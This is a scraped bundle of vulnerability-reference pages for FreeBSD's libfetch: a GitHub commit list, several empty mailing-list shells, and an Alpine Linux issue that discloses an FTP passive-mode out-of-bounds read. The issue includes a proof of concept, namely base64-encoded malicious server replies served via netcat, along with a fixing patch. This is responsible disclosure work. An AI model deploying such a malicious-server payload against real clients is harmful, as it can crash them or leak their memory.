  Show description for c44be5a[![kevans91](https://avatars.githubusercontent.com/u/646318?v=4&size=32)](/kevans91)[kevans91](/freebsd/freebsd-src/commits?author=kevans91)committed[c44be5a](/freebsd/freebsd-src/commit/c44be5aa0a9e889c2ebde73986acabdaab952c65)Copy full SHA for c44be5a
### Commits on Feb 5, 2020

* #### [libfetch: disallow invalid escape sequences](/freebsd/freebsd-src/commit/83372bda16b53157be476df6f9c6aac9f2bc12a3 "libfetch: disallow invalid escape sequences Per RFC1738 escape is \"% hex hex\"; other sequences do not form a valid URL. Suggested by: Matthew Dillon Reviewed by: Matthew Dillon MFC after: 1 week")

  Show description for 83372bd[![emaste](https://avatars.githubusercontent.com/u/1034582?v=4&size=32)](/emaste)[emaste](/freebsd/freebsd-src/commits?author=emaste)committed[83372bd](/freebsd/freebsd-src/commit/83372bda16b53157be476df6f9c6aac9f2bc12a3)Copy full SHA for 83372bd
### Commits on Jan 28, 2020

* #### [Fix urldecode buffer overrun.](/freebsd/freebsd-src/commit/6fb3f9944faefa41b322b5e1bc0d280b4005ca44 "Fix urldecode buffer overrun. Reported by: Duncan Overbruck Security: CVE-2020-7450")

  Show description for 6fb3f99[![tetlowgm](https://avatars.githubusercontent.com/u/10554352?v=4&size=32)](/tetlowgm)[tetlowgm](/freebsd/freebsd-src/commits?author=tetlowgm)committed[6fb3f99](/freebsd/freebsd-src/commit/6fb3f9944faefa41b322b5e1bc0d280b4005ca44)Copy full SHA for 6fb3f99
## Pagination

[Previous](/freebsd/freebsd-src/commits/main/lib/libfetch?before=5c341fe5123d4aa6961066542de63dd4431d004d+0)[Next](/freebsd/freebsd-src/commits/main/lib/libfetch?after=5c341fe5123d4aa6961066542de63dd4431d004d+34)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from lists.apache.org_03b814fd_20250115_093448.html ===


[![Foal logo](images/logo.png)](./)

* ![Display Settings](images/cog.png "Display Settings")
  **Email display mode:**

  ---

   Modern rendering

   Legacy rendering
* ![Logged out](images/user_loggedout.png "Not logged in")

This site requires JavaScript enabled. Please enable it.



=== Content from lists.apache.org_f728ca37_20250115_093447.html ===


[![Foal logo](images/logo.png)](./)

* ![Display Settings](images/cog.png "Display Settings")
  **Email display mode:**

  ---

   Modern rendering

   Legacy rendering
* ![Logged out](images/user_loggedout.png "Not logged in")

This site requires JavaScript enabled. Please enable it.



=== Content from gitlab.alpinelinux.org_e6d541e2_20250115_093446.html ===


[Skip to content](#content-body)
GitLab
[![](data:image/gif;base64...)](/ "Homepage")

* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Register](/users/sign_up)

# libfetch information leak or crash

Dear Alpine Linux team,

I have discovered a potentially security-relevant issue in libfetch.
It is used in apk and I have reported the issue to FreeBSD upstream.
Maybe you want to be informed about this before it is fixed there.

This is the mail I have just sent to the FreeBSD security team.

Problem:

The passive mode in FTP communication allows an out of boundary read
while libfetch uses strtol to parse the relevant numbers into address
bytes. It does not check if the line ends prematurely. If it does,
the for-loop condition checks for \*p == '\0' one byte too late because
p++ was already performed.

Impact:

The connection buffer size can be controlled by a malicious FTP server
because the size is increased until a newline is encountered (or no more
characters are read). This also allows to move the buffer into more
interesting areas within the address space, potentially parsing
relevant numbers for the attacker.

Since these bytes become available to the server in form of a new
TCP connection to a constructed port number or even part of the IPv6
address this is a potential information leak.

Proof of Concept:

Set up the malicious FTP server like this

```
cat > replies.txt.b64 << EOF
begin-base64 644 replies.txt
MjIwIG9rCjIzMCBvawoyNTcgIi8iCjIwMCBvawoyMDAgb2sKMjEzIDE4NDQ2NzQ0MDczNzA5NTUx
NjE2CjIxMyAwMDAwMDAwMDAwMDAwMAoyMDAgb2sKMjAwIG9rCjIyOCAxCjIyOCAxMTExMTExMTEx
MTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTEx
MTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTEx
MTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTEx
MTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTEx
MTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTEx
MTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTEx
MTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTEx
MTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTEx
MTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTEx
MTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTEx
MTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTEx
MTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTEx
MTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTEx
MTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTEx
MTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTEx
MTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTEx
MTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTEx
MTExMTExMTExMTExMTExMTExMTEx
====
EOF
b64decode -o replies.txt replies.txt.b64
nc -Nl ::1 21 < replies.txt
```

Compile libfetch and fetch with
CFLAGS="-fsanitize=address -fsanitize=undefined" and start client

```
fetch 'ftp://[::1]/poc'
```

Considerations:

Since libfetch is used outside of FreeBSD as well, e.g. in Alpine Linux
package keeper apk, I recommend to issue a CVE for this so these
users are informed about the patch as well.

The information leak is fixed in the second ftp.c patch chunk.

Sincerely,
Samanta

```
Index: fetch.c
===================================================================
--- fetch.c	(revision 370066)
+++ fetch.c	(working copy)
@@ -421,7 +421,7 @@
 	/* port */
 	if (*p == ':') {
 		for (n = 0, q = ++p; *q && (*q != '/'); q++) {
-			if (*q >= '0' && *q <= '9' && n < INT_MAX / 10) {
+			if (*q >= '0' && *q <= '9' && n < IPPORT_MAX) {
 				n = n * 10 + (*q - '0');
 			} else {
 				/* invalid port */
Index: ftp.c
===================================================================
--- ftp.c	(revision 370066)
+++ ftp.c	(working copy)
@@ -424,8 +424,14 @@
 	}
 	for (ln = conn->buf + 4; *ln && isspace((unsigned char)*ln); ln++)
 		/* nothing */ ;
-	for (us->size = 0; *ln && isdigit((unsigned char)*ln); ln++)
+	for (us->size = 0; *ln && isdigit((unsigned char)*ln); ln++) {
+		if (us->size > OFF_MAX / 10 - (*ln - '0')) {
+			ftp_seterr(FTP_PROTOCOL_ERROR);
+			us->size = -1;
+			return (-1);
+		}
 		us->size = us->size * 10 + *ln - '0';
+	}
 	if (*ln && !isspace((unsigned char)*ln)) {
 		ftp_seterr(FTP_PROTOCOL_ERROR);
 		us->size = -1;
@@ -704,8 +710,11 @@
 				goto ouch;
 			}
 			l = (e == FTP_PASSIVE_MODE ? 6 : 21);
-			for (i = 0; *p && i < l; i++, p++)
+			for (i = 0; *p && i < l; i++, p++) {
 				addr[i] = strtol(p, &p, 10);
+				if (*p == '\0' && i < l - 1)
+					break;
+			}
 			if (i < l) {
 				e = FTP_PROTOCOL_ERROR;
 				goto ouch;
Index: http.c
===================================================================
--- http.c	(revision 370066)
+++ http.c	(working copy)
@@ -163,11 +163,15 @@
 		if (!isxdigit((unsigned char)*p))
 			return (-1);
 		if (isdigit((unsigned char)*p)) {
+			if (io->chunksize > OFF_MAX / 16 - (*p - '0'))
+				return (-1);
 			io->chunksize = io->chunksize * 16 +
 			    *p - '0';
 		} else {
-			io->chunksize = io->chunksize * 16 +
-			    10 + tolower((unsigned char)*p) - 'a';
+			int digit = 10 + tolower((unsigned char)*p) - 'a';
+			if (io->chunksize > OFF_MAX / 16 - digit)
+				return (-1);
+			io->chunksize = io->chunksize * 16 + digit;
 		}
 	}

@@ -908,8 +912,11 @@
 {
 	off_t len;

-	for (len = 0; *p && isdigit((unsigned char)*p); ++p)
+	for (len = 0; *p && isdigit((unsigned char)*p); ++p) {
+		if (len > OFF_MAX / 10 - (*p - '0'))
+			return (-1);
 		len = len * 10 + (*p - '0');
+	}
 	if (*p)
 		return (-1);
 	DEBUGF("content length: [%lld]\n", (long long)len);
@@ -932,17 +939,26 @@
 		first = last = -1;
 		++p;
 	} else {
-		for (first = 0; *p && isdigit((unsigned char)*p); ++p)
+		for (first = 0; *p && isdigit((unsigned char)*p); ++p) {
+			if (first > OFF_MAX / 10 - (*p - '0'))
+				return (-1);
 			first = first * 10 + *p - '0';
+		}
 		if (*p != '-')
 			return (-1);
-		for (last = 0, ++p; *p && isdigit((unsigned char)*p); ++p)
+		for (last = 0, ++p; *p && isdigit((unsigned char)*p); ++p) {
+			if (last > OFF_MAX / 10 - (*p - '0'))
+				return (-1);
 			last = last * 10 + *p - '0';
+		}
 	}
 	if (first > last || *p != '/')
 		return (-1);
-	for (len = 0, ++p; *p && isdigit((unsigned char)*p); ++p)
+	for (len = 0, ++p; *p && isdigit((unsigned char)*p); ++p) {
+		if (len > OFF_MAX / 10 - (*p - '0'))
+			return (-1);
 		len = len * 10 + *p - '0';
+	}
 	if (*p || len < last - first + 1)
 		return (-1);
 	if (first == -1) {
```

Assignee
Loading

Time tracking
Loading



=== Content from lists.apache.org_c8659f42_20250115_093447.html ===


[![Foal logo](images/logo.png)](./)

* ![Display Settings](images/cog.png "Display Settings")
  **Email display mode:**

  ---

   Modern rendering

   Legacy rendering
* ![Logged out](images/user_loggedout.png "Not logged in")

This site requires JavaScript enabled. Please enable it.



=== Content from lists.apache.org_e6c64a3e_20250115_093447.html ===


[![Foal logo](images/logo.png)](./)

* ![Display Settings](images/cog.png "Display Settings")
  **Email display mode:**

  ---

   Modern rendering

   Legacy rendering
* ![Logged out](images/user_loggedout.png "Not logged in")

This site requires JavaScript enabled. Please enable it.


